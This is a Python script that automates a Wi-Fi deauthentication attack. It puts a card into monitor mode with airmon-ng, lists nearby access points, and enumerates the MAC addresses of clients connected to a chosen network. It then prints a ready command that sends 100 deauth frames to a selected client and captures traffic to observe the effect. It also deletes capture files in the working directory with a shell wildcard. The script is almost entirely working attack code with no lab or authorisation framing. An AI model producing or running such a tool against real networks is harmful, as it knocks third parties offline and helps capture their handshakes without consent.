#!/usr/bin/env python3
import subprocess
import time
import argparse
import re
from scapy.all import rdpcap, Dot11

def enable_monitor_mode(iface):
    print(f"[+] Enabling monitor mode on {iface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"])
    subprocess.run(["sudo", "rfkill", "unblock", "1"])
    subprocess.run(["sudo", "airmon-ng", "start", iface])
    print("[✓] Monitor mode enabled.")

def capture_probe_frames(output_prefix, iface, duration):
    print(f"[+] Capturing AP beacons for {duration}s...")
    proc = subprocess.Popen(["sudo", "airodump-ng", "-w", output_prefix, iface],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    return f"{output_prefix}-01.cap"

def extract_ap_dict(cap_file):
    print(f"[+] Parsing {cap_file} to extract APs...")
    result = subprocess.run(["python3", "extract-aps.py", cap_file], capture_output=True, text=True)
    lines = result.stdout.strip().split("\n")

    ap_dict = {}
    print("\n[Available SSIDs]")
    for line in lines:
        if not line.strip().startswith("BSSID:"):
            continue
        match = re.search(r"BSSID:\s*([0-9A-Fa-f:]{17})\s*\|\s*ESSID:\s*(.*?)\s*\|\s*Channel:\s*(\d+)", line)
        if match:
            bssid = match.group(1).strip()
            ssid = match.group(2).strip()
            channel = match.group(3).strip()

            if ssid == "":
                continue
            ap_dict[ssid] = {
                "bssid": bssid,
                "channel": channel
            }
            print(f"- {ssid}")
    return ap_dict

def scan_clients(bssid, channel, output_prefix, iface, duration):
    print(f"[+] Scanning clients for AP {bssid} on channel {channel}...")
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(channel)])
    proc = subprocess.Popen([
        "sudo", "airodump-ng", "--bssid", bssid, "-c", str(channel),
        "-w", output_prefix, iface
    ],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(duration)
    proc.terminate()
    print(f"[✓] Client capture complete: {output_prefix}-01.cap")
    return f"{output_prefix}-01.cap"

def extract_clients_from_cap(cap_file, ap_bssid):
    print(f"[+] Parsing {cap_file} for clients connected to {ap_bssid}...")
    packets = rdpcap(cap_file)
    clients = set()

    for pkt in packets:
        if pkt.haslayer(Dot11):
            addr1 = pkt.addr1
            addr2 = pkt.addr2
            if addr1 and addr2:
                if addr1.lower() == ap_bssid.lower():
                    clients.add(addr2)
                elif addr2.lower() == ap_bssid.lower():
                    clients.add(addr1)

    clients = sorted(clients)
    print("[✓] Connected clients found:")
    for idx, client in enumerate(clients):
        print(f"{idx + 1}. {client}")
    return clients

def remove_old_files():
    subprocess.run("rm -f *.netxml *.csv *.cap", shell=True)

def start_capture_on_channel(bssid, channel, iface):
    print(f"[+] Starting passive capture on channel {channel} with {iface}...")
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(channel)])
    output_file = "deauth-capture"
    proc = subprocess.Popen(["sudo", "airodump-ng", "--bssid", str(bssid), "-c", str(channel), "-w", output_file, iface],
                            stdout=subprocess.DEVNULL)
    return proc

if __name__ == "__main__":
    print("[+] Removing old files...")
    remove_old_files()
    print("[✓] Old file removal complete.")
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--iface", default="wlp1s0", help="Wi-Fi interface (e.g. wlp1s0)")
    parser.add_argument("--mon", default="wlp1s0mon", help="Monitor mode interface (created by airmon-ng)")
    parser.add_argument("--duration", type=int, default=10, help="Capture duration (in seconds)")
    args = parser.parse_args()

    enable_monitor_mode(args.iface)
    cap_file = capture_probe_frames("scan-aps", args.mon, args.duration)
    ap_dict = extract_ap_dict(cap_file)

    ssid = input("\n[?] Enter SSID from the list above: ").strip()
    if ssid not in ap_dict:
        print(f"[!] SSID '{ssid}' not found. Exiting.")
        exit(1)

    bssid = ap_dict[ssid]["bssid"]
    channel = ap_dict[ssid]["channel"]

    client_cap = scan_clients(bssid, channel, "client-capture", args.mon, args.duration)
    clients = extract_clients_from_cap(client_cap, bssid)

    if not clients:
        print("[!] No clients found. Exiting.")
        exit(1)

    # Select a client
    choice = input(f"\n[?] Select client number to deauth (1-{len(clients)}): ").strip()
    try:
        client_idx = int(choice) - 1
        if client_idx < 0 or client_idx >= len(clients):
            raise ValueError
    except ValueError:
        print("[!] Invalid client number.")
        exit(1)

    client_mac = clients[client_idx]
    deauth_cmd = f"sudo ./venv/bin/python3 custom-deauth.py {bssid} {client_mac} {args.mon} 100"

    print(f"\n[🛑] Suggested Deauth Command:\n{deauth_cmd}\n\n")

    # Optional: Start capture to observe deauth effect
    print(f"[+] Starting passive capture on channel {channel} for ssid {ssid}...")
    capture_proc = start_capture_on_channel(bssid, channel, args.mon)
    print("[*] Press Ctrl+C to stop capture.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[✓] Stopping live capture...")
        capture_proc.terminate()
